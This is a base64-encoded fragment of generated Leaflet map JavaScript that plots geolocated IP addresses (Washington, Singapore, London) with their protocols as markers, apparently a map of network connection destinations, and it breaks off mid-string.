CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2U4NDY0NjEyNmY5MjRlM2I5ZjBmMjRmYmJhYjM0NTBmLmJpbmRQb3B1cChwb3B1cF85ZDhlMmUyN2YxNGI0OWY4YmM2MWVlYzY2ZjMxZjU3ZSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfZTg0NjQ2MTI2ZjkyNGUzYjlmMGYyNGZiYmFiMzQ1MGYuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9jNGIzNTM4YjA5NGE0NmIxYTg5YWE4YTljYzA0ZTFmMiA9IEwubWFya2VyKAogICAgICAgICAgICBbMS4yOTMxLCAxMDMuODU1OF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2UzZjkyNjViZThlMTQ0YjU4NTk4ZjM2MjdlYTY0NTk5ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2M0YjM1MzhiMDk0YTQ2YjFhODlhYThhOWNjMDRlMWYyLnNldEljb24oaWNvbl9lM2Y5MjY1YmU4ZTE0NGI1ODU5OGYzNjI3ZWE2NDU5OSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF80Yzk0MDg0NjA0MTY0MTE0OTExMGZjMDhlMWE2NzY1ZiA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzM2ZmM1YjE1MzlkZTRmMmNiZDk5NjVhYzBiMWUwNTBlID0gJChgPGRpdiBpZD0iaHRtbF8zNmZjNWIxNTM5ZGU0ZjJjYmQ5OTY1YWMwYjFlMDUwZSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9U0csIENvdW50cnlOYW1lPVNpbmdhcG9yZSwgU3RhdGU9Q2VudHJhbCBTaW5nYXBvcmUgQ29tbXVuaXR5IERldmVsb3BtZW50IENvdW5jaWwsIENpdHk9U2luZ2Fwb3JlLCBMb25naXR1ZGU9MTAzLjg1NTgsIExhdGl0dWRlPTEuMjkzMTxicj4yMy45Ny42MC4yMTQ8YnI+cHJvdG9jb2w9aHR0cDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfNGM5NDA4NDYwNDE2NDExNDkxMTBmYzA4ZTFhNjc2NWYuc2V0Q29udGVudChodG1sXzM2ZmM1YjE1MzlkZTRmMmNiZDk5NjVhYzBiMWUwNTBlKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfYzRiMzUzOGIwOTRhNDZiMWE4OWFhOGE5Y2MwNGUxZjIuYmluZFBvcHVwKHBvcHVwXzRjOTQwODQ2MDQxNjQxMTQ5MTEwZmMwOGUxYTY3NjVmKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl9jNGIzNTM4YjA5NGE0NmIxYTg5YWE4YTljYzA0ZTFmMi5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBTaW5nYXBvcmUsIFNpbmdhcG9yZSwgcHJvdG9jb2w9aHR0cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzM3OTQyMDY0M2RmNjQ2MDE4MThjNTgwZmEzOGRkOWNmID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszNy43NTEsIC05Ny44MjJdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9jNjE2N2VjNTY1ZmE0MjA4YTY5MTM2Y2E3N2JhMGUwZSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl8zNzk0MjA2NDNkZjY0NjAxODE4YzU4MGZhMzhkZDljZi5zZXRJY29uKGljb25fYzYxNjdlYzU2NWZhNDIwOGE2OTEzNmNhNzdiYTBlMGUpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfNDUyYjY0YTBkNWMyNGEwMGEwNjRiZWVkZDcyOWE0MDkgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF8zY2U3NzAzYjBmY2M0ZmY0YTk4NGRlYmViODNlZjkzZCA9ICQoYDxkaXYgaWQ9Imh0bWxfM2NlNzcwM2IwZmNjNGZmNGE5ODRkZWJlYjgzZWY5M2QiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBMb25naXR1ZGU9LTk3LjgyMiwgTGF0aXR1ZGU9MzcuNzUxPGJyPjIwLjM4Ljk4LjE2NDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfNDUyYjY0YTBkNWMyNGEwMGEwNjRiZWVkZDcyOWE0MDkuc2V0Q29udGVudChodG1sXzNjZTc3MDNiMGZjYzRmZjRhOTg0ZGViZWI4M2VmOTNkKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfMzc5NDIwNjQzZGY2NDYwMTgxOGM1ODBmYTM4ZGQ5Y2YuYmluZFBvcHVwKHBvcHVwXzQ1MmI2NGEwZDVjMjRhMDBhMDY0YmVlZGQ3MjlhNDA5KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl8zNzk0MjA2NDNkZjY0NjAxODE4YzU4MGZhMzhkZDljZi5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBOb25lLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzkwODQ1ZDEyOWU2MjRiYTNhOWExMDg5ZTU4NWI2MmJkID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszOC43MTYzLCAtNzguMTcwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2ZlZDdjMDg2N2U2NTQzZjliMDI0YTg3OGZhZDNlYmFlID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzkwODQ1ZDEyOWU2MjRiYTNhOWExMDg5ZTU4NWI2MmJkLnNldEljb24oaWNvbl9mZWQ3YzA4NjdlNjU0M2Y5YjAyNGE4NzhmYWQzZWJhZSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF9iMzc0YWY4ODljZTk0MjI4YjkxN2RkNDA2MjYyNTBhNiA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzZkY2Q5NWE2NGRkMzRlOTg4ZTllOGEwNjY5M2M4NWQzID0gJChgPGRpdiBpZD0iaHRtbF82ZGNkOTVhNjRkZDM0ZTk4OGU5ZThhMDY2OTNjODVkMyIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVZpcmdpbmlhLCBDaXR5PVdhc2hpbmd0b24sIExvbmdpdHVkZT0tNzguMTcwNCwgTGF0aXR1ZGU9MzguNzE2Mzxicj41Mi4xNjguNTAuNzk8YnI+cHJvdG9jb2w9aHR0cDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfYjM3NGFmODg5Y2U5NDIyOGI5MTdkZDQwNjI2MjUwYTYuc2V0Q29udGVudChodG1sXzZkY2Q5NWE2NGRkMzRlOTg4ZTllOGEwNjY5M2M4NWQzKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfOTA4NDVkMTI5ZTYyNGJhM2E5YTEwODllNTg1YjYyYmQuYmluZFBvcHVwKHBvcHVwX2IzNzRhZjg4OWNlOTQyMjhiOTE3ZGQ0MDYyNjI1MGE2KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl85MDg0NWQxMjllNjI0YmEzYTlhMTA4OWU1ODViNjJiZC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfN2FmOWMyNWE1Njg4NDhiZWEyOGQ3OGE3NTdkYmEzYzEgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fNTVhNTM4Y2ZkMmJkNDM5ZThhZWJhYjZmOTU2MWY5NzQgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfN2FmOWMyNWE1Njg4NDhiZWEyOGQ3OGE3NTdkYmEzYzEuc2V0SWNvbihpY29uXzU1YTUzOGNmZDJiZDQzOWU4YWViYWI2Zjk1NjFmOTc0KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzQ1MmQyZTUwMDI5MjQ5OTI4NjRkZDVjYTFlOTIyYzA3ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfYWQwZDcxZWY1NTZjNGQ0YTkyZTk2YTVjYWI3YWYyODYgPSAkKGA8ZGl2IGlkPSJodG1sX2FkMGQ3MWVmNTU2YzRkNGE5MmU5NmE1Y2FiN2FmMjg2IiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjUyLjIzOS4xNTIuMTA8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzQ1MmQyZTUwMDI5MjQ5OTI4NjRkZDVjYTFlOTIyYzA3LnNldENvbnRlbnQoaHRtbF9hZDBkNzFlZjU1NmM0ZDRhOTJlOTZhNWNhYjdhZjI4Nik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzdhZjljMjVhNTY4ODQ4YmVhMjhkNzhhNzU3ZGJhM2MxLmJpbmRQb3B1cChwb3B1cF80NTJkMmU1MDAyOTI0OTkyODY0ZGQ1Y2ExZTkyMmMwNykKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfN2FmOWMyNWE1Njg4NDhiZWEyOGQ3OGE3NTdkYmEzYzEuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9mM2FjYTNhYzFmMTc0MGJkYjVlZDI4NWU5MjQzNTU3OSA9IEwubWFya2VyKAogICAgICAgICAgICBbNTEuNTE0MiwgLTAuMDkzMV0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzlmZjQ2MzdiYjU1ZjQxNzhiMDQwODc1ODExZTEzMmU5ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2YzYWNhM2FjMWYxNzQwYmRiNWVkMjg1ZTkyNDM1NTc5LnNldEljb24oaWNvbl85ZmY0NjM3YmI1NWY0MTc4YjA0MDg3NTgxMWUxMzJlOSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF85ZjdjODgyNTcxYTM0NjI4OTQ4NzkxNTQ3OWVhN2EzOSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzc4NzkyYWFkYjczZTRjODhhZDBjYjBiZWQ3MWZiZDY2ID0gJChgPGRpdiBpZD0iaHRtbF83ODc5MmFhZGI3M2U0Yzg4YWQwY2IwYmVkNzFmYmQ2NiIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9R0IsIENvdW50cnlOYW1lPVVuaXRlZCBLaW5nZG9tLCBTdGF0ZT1FbmdsYW5kLCBDaXR5PUxvbmRvbiwgTG9uZ2l0dWRlPS0wLjA5MzEsIExhdGl0dWRlPTUxLjUxNDI8YnI+OTEuMTg5Ljk0LjQ8YnI+cHJvdG9jb2w9bnRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF85ZjdjODgyNTcxYTM0NjI4OTQ4NzkxNTQ3OWVhN2EzOS5zZXRDb250ZW50KGh0bWxfNzg3OTJhYWRiNzNlNGM4OGFkMGNiMGJlZDcxZmJkNjYpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9mM2FjYTNhYzFmMTc0MGJkYjVlZDI4NWU5MjQzNTU3OS5iaW5kUG9wdXAocG9wdXBfOWY3Yzg4MjU3MWEzNDYyODk0ODc5MTU0NzllYTdhMzkpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2YzYWNhM2FjMWYxNzQwYmRiNWVkMjg1ZTkyNDM1NTc5LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYExvbmRvbiwgVW5pdGVkIEtpbmdkb20sIHByb3RvY29sPW50cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2MyN2M0ODVjN2E3NjQxMTc5NzJhOTk3ZTk4Y2NkMjE2ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszOC43MTYzLCAtNzguMTcwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzcxMWQ4NGRmYmQ2NzRhMWQ4MWFiYmE3NTVhYTc3OTEzID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2MyN2M0ODVjN2E3NjQxMTc5NzJhOTk3ZTk4Y2NkMjE2LnNldEljb24oaWNvbl83MTFkODRkZmJkNjc0YTFkODFhYmJhNzU1YWE3NzkxMyk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF84NDExN2UxNzA0YWI0NTI3OTkxY2I5NmM3ZTdhZWE0MyA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzM0NWUwYTdiMzg1NjQxYmQ4YWUyZGM3MmZjZjg3NGYwID0gJChgPGRpdiBpZD0iaHRtbF8zNDVlMGE3YjM4NTY0MWJkOGFlMmRjNzJmY2Y4NzRmMCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVZpcmdpbmlhLCBDaXR5PVdhc2hpbmd0b24sIExvbmdpdHVkZT0tNzguMTcwNCwgTGF0aXR1ZGU9MzguNzE2Mzxicj41Mi4xNjguNTAuNzk8YnI+cHJvdG9jb2w9aHR0cDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfODQxMTdlMTcwNGFiNDUyNzk5MWNiOTZjN2U3YWVhNDMuc2V0Q29udGVudChodG1sXzM0NWUwYTdiMzg1NjQxYmQ4YWUyZGM3MmZjZjg3NGYwKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfYzI3YzQ4NWM3YTc2NDExNzk3MmE5OTdlOThjY2QyMTYuYmluZFBvcHVwKHBvcHVwXzg0MTE3ZTE3MDRhYjQ1Mjc5OTFjYjk2YzdlN2FlYTQzKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl9jMjdjNDg1YzdhNzY0MTE3OTcyYTk5N2U5OGNjZDIxNi5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfMTU5NjM2OGNjNjFkNDc0YWI0NTRlMTE3MTc4NmQwY2IgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fOGM3YzNlNGFiOThmNGVmMTg0YmY1ZjhhZWMwNTNhNjAgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfMTU5NjM2OGNjNjFkNDc0YWI0NTRlMTE3MTc4NmQwY2Iuc2V0SWNvbihpY29uXzhjN2MzZTRhYjk4ZjRlZjE4NGJmNWY4YWVjMDUzYTYwKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzM4ZGNhNWE1YjlmYTQxYzQ5MjEzNjRkYmYwODQzYzQ4ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfZTk0NzAxZTJhYmE0NDVjNDgyOGYzYzE5YzJkZWVhOTIgPSAkKGA8ZGl2IGlkPSJodG1sX2U5NDcwMWUyYWJhNDQ1YzQ4MjhmM2MxOWMyZGVlYTkyIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjUyLjIzOS4yMjAuMzI8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzM4ZGNhNWE1YjlmYTQxYzQ5MjEzNjRkYmYwODQzYzQ4LnNldENvbnRlbnQoaHRtbF9lOTQ3MDFlMmFiYTQ0NWM0ODI4ZjNjMTljMmRlZWE5Mik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzE1OTYzNjhjYzYxZDQ3NGFiNDU0ZTExNzE3ODZkMGNiLmJpbmRQb3B1cChwb3B1cF8zOGRjYTVhNWI5ZmE0MWM0OTIxMzY0ZGJmMDg0M2M0OCkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfMTU5NjM2OGNjNjFkNDc0YWI0NTRlMTE3MTc4NmQwY2IuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl81ZTRmMjc0NjgyOTg0YTM3YTkwMzRkYmRiNGM5MWYxNCA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl8zY2NkOTc3M2UyZTU0ZjQyOTA4ZjJiZDE1ZTBiZGMyMSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl81ZTRmMjc0NjgyOTg0YTM3YTkwMzRkYmRiNGM5MWYxNC5zZXRJY29uKGljb25fM2NjZDk3NzNlMmU1NGY0MjkwOGYyYmQxNWUwYmRjMjEpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfMDNlOGM5NDgxODcxNDRiYTlmNmI3MTlmMzBlNjAzNDcgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF8wMGNlN2ViZGExOTA0YzY5OWMxOThlYTMzNzg4Y2I2ZCA9ICQoYDxkaXYgaWQ9Imh0bWxfMDBjZTdlYmRhMTkwNGM2OTljMTk4ZWEzMzc4OGNiNmQiIHN0